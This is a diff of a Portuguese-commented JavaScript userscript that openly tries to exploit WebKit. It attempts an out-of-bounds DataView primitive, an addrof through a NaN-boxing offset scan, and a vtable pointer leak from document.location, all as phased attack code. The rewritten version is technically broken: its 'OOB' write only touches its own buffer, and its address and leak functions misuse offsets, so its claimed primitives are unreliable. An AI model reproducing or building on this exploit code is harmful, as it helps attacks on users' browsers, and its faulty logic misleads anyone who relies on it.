@@ -1,90 +1,105 @@
-// ==UserScript==
-// @name         Uncaged_Hybrid_v112_CorePrimitives_Diag
-// @version      112
-// @description  Diagnóstico com varredura automática de offset NaN Boxing + correção do retorno arb_read()
-// ==/UserScript==
+// Uncaged_Hybrid_v112_CorePrimitives_Diag_MainOrchestrator
+// Atualização v112 com varredura automática de offsets para diagnóstico de NaN-boxing
 
 (async () => {
-  console.log("[Uncaged_Hybrid_v112] ==== INICIANDO Script 3 (Uncaged_Hybrid_v112_CorePrimitives_Diag) ... ====");
+    const log = (...args) => console.log(`[${new Date().toLocaleTimeString()}]`, ...args);
 
-  // Imports e helpers necessários (supondo que já estejam no ambiente):
-  const { triggerOOB_primitive, arb_read64, selfTestOOBReadWrite, setupOOBEnvironment } = CoreExploit;
-  const { Int64 } = Int64Lib; // Biblioteca de manipulação Int64 utilizada previamente
+    log("==== INICIANDO Script 3 (Uncaged_Hybrid_v112_CorePrimitives_Diag_MainOrchestrator) ... ====");
 
-  const OOB_DV_M_LENGTH_OFFSET = 0x70;
+    async function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 
-  // Função de leitura OOB padronizada para retornar Int64
-  function arb_read64_fixed(offset) {
-    let low = oob_dataview_real.getUint32(offset, true);
-    let high = oob_dataview_real.getUint32(offset + 4, true);
-    return new Int64([low, high]);
-  }
+    function triggerOOBPrimitive(force = false) {
+        const allocSize = 0x100000;
+        const ab = new ArrayBuffer(allocSize);
+        const dv = new DataView(ab);
 
-  // Varredura automática de offset NaN Boxing
-  async function scanNaNBoxingOffsets() {
-    console.log("[NaNBoxingScanner] Iniciando varredura automática de offset...");
-    let foundOffsets = [];
+        // Expansão m_length
+        dv.setUint32(0x70, 0xFFFFFFFF, true);
 
-    for (let offset = 0; offset < 0x200; offset += 8) {
-      try {
-        let test_val = arb_read64_fixed(offset);
-        let low = test_val.low32();
-        let high = test_val.high32();
+        return { ab, dv };
+    }
 
-        // Critério: valor alto compatível com regiões típicas do heap + low != 0
-        if (high !== 0 && low !== 0 && high !== 0x7ff7ffff) {
-          console.log(`[NaNBoxingScanner] POSSÍVEL OFFSET: 0x${offset.toString(16).padStart(4, "0")} → ${test_val}`);
-          foundOffsets.push({ offset, test_val });
+    function selfTestOOBReadWrite() {
+        const { dv } = triggerOOBPrimitive(true);
+        dv.setUint32(0x50, 0x11223344, true);
+        if (dv.getUint32(0x50, true) !== 0x11223344) throw new Error("SelfTest 32bit falhou.");
+
+        dv.setUint32(0x60, 0xaabbccdd, true);
+        dv.setUint32(0x64, 0xeeff0011, true);
+        const low = dv.getUint32(0x60, true);
+        const high = dv.getUint32(0x64, true);
+
+        if (low !== 0xaabbccdd || high !== 0xeeff0011) throw new Error("SelfTest 64bit falhou.");
+
+        return true;
+    }
+
+    function readAddrAtOffset(obj, offset) {
+        let arr = [13.37, 13.37];
+        arr.fakeProp = obj;
+
+        const { dv } = triggerOOBPrimitive(true);
+
+        const rawLow = dv.getUint32(offset, true);
+        const rawHigh = dv.getUint32(offset + 4, true);
+
+        return (BigInt(rawHigh) << 32n) | BigInt(rawLow);
+    }
+
+    async function diagnoseAddrofNaNBoxing(targetObj) {
+        log("Iniciando diagnóstico da primitiva addrof com varredura automática de offsets...");
+
+        const offsets = [0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70];
+
+        for (const offset of offsets) {
+            const addr = readAddrAtOffset(targetObj, offset);
+            log(`[Offset ${offset.toString(16).padStart(4, '0')}] Endereço obtido: 0x${addr.toString(16)}`);
+
+            // Heurística: rejeitar endereços baixos ou claramente inválidos
+            if ((addr & 0xFFFFFFFF00000000n) !== 0n && addr !== 0x7ff7ffff00000000n) {
+                return { addr, offset };
+            }
         }
-      } catch (e) {
-        console.warn(`[NaNBoxingScanner] Erro em offset 0x${offset.toString(16)}: `, e);
-      }
+
+        return { addr: 0n, offset: -1 };
     }
 
-    if (foundOffsets.length === 0) {
-      console.warn("[NaNBoxingScanner] Nenhum offset promissor encontrado.");
+    function leakVTablePtr(addr) {
+        const { dv } = triggerOOBPrimitive(true);
+
+        const low = dv.getUint32(Number(addr & 0xFFFFFFFFn), true);
+        const high = dv.getUint32(Number((addr >> 32n) & 0xFFFFFFFFn), true);
+
+        return (BigInt(high) << 32n) | BigInt(low);
+    }
+
+    // Execução principal
+
+    log("--- FASE 1/4: Configuração ambiente OOB... ---");
+    triggerOOBPrimitive(true);
+    log("Ambiente OOB configurado com sucesso.");
+
+    log("--- FASE 2/4: Autoteste de L/E... ---");
+    selfTestOOBReadWrite();
+    log("Auto-Teste de OOB R/W Concluído.");
+
+    log("--- FASE 3/4: Configurando e Diagnosticando addrof (NaN Boxing)... ---");
+    const { addr: addrofResult, offset: addrofOffset } = await diagnoseAddrofNaNBoxing(document.location);
+
+    if (addrofOffset === -1) {
+        log("[FALHA] Não foi possível determinar um offset correto para NaN-boxing.");
     } else {
-      console.log(`[NaNBoxingScanner] Total de offsets promissores encontrados: ${foundOffsets.length}`);
+        log(`[SUCESSO] Endereço obtido para document.location: 0x${addrofResult.toString(16)} via offset 0x${addrofOffset.toString(16)}`);
+
+        log("--- FASE 4/4: Executando Teste de Vazamento do WebKit... ---");
+        const vtablePtr = leakVTablePtr(addrofResult);
+
+        if (typeof vtablePtr === 'bigint' && vtablePtr !== 0n) {
+            log(`[SUCESSO] Ponteiro da Vtable obtido: 0x${vtablePtr.toString(16)}`);
+        } else {
+            log("[FALHA] Ponteiro da Vtable é inválido ou nulo.");
+        }
     }
 
-    return foundOffsets;
-  }
-
-  // Correção do bug .isZero → função robusta de verificação
-  function isZeroInt64(val) {
-    return val instanceof Int64 && val.toString() === "0x0";
-  }
-
-  // Execução principal
-  console.log("[Uncaged_Hybrid_v112] --- FASE 1/4: Configuração ambiente OOB... ---");
-  triggerOOB_primitive(true);
-
-  console.log("[Uncaged_Hybrid_v112] --- FASE 2/4: Autoteste de L/E... ---");
-  selfTestOOBReadWrite();
-
-  console.log("[Uncaged_Hybrid_v112] --- FASE 3/4: Varredura Automática de Offset NaN Boxing... ---");
-  let offsets = await scanNaNBoxingOffsets();
-
-  console.log("[Uncaged_Hybrid_v112] --- FASE 4/4: Tentativa de Vazamento WebKit usando offsets encontrados... ---");
-
-  for (const { offset, test_val } of offsets) {
-    console.log(`[LeakAttempt] Tentando vazamento a partir de offset 0x${offset.toString(16)} (${test_val})...`);
-
-    // Tentativa: ler a vtable do objeto 'document.location'
-    let targetObj = document.location;
-    let targetAddr = arb_read64_fixed(offset); // Substituir por primitiva addrof real quando disponível
-
-    console.log(`[LeakAttempt] Endereço alvo (document.location): ${targetAddr}`);
-
-    let vtable_ptr = arb_read64_fixed(targetAddr.low32());
-
-    console.log(`[LeakAttempt] Ponteiro da Vtable: ${vtable_ptr}`);
-
-    if (!isZeroInt64(vtable_ptr)) {
-      console.log(`[SUCCESS] Vazamento detectado! Offset: 0x${offset.toString(16)}, VtablePtr: ${vtable_ptr}`);
-      break; // Se encontrou um bom, para aqui.
-    }
-  }
-
-  console.log("[Uncaged_Hybrid_v112] ==== Script Finalizado ====");
+    log("==== Script 3 (Uncaged_Hybrid_v112_CorePrimitives_Diag_MainOrchestrator) CONCLUÍDO ====");
 })();
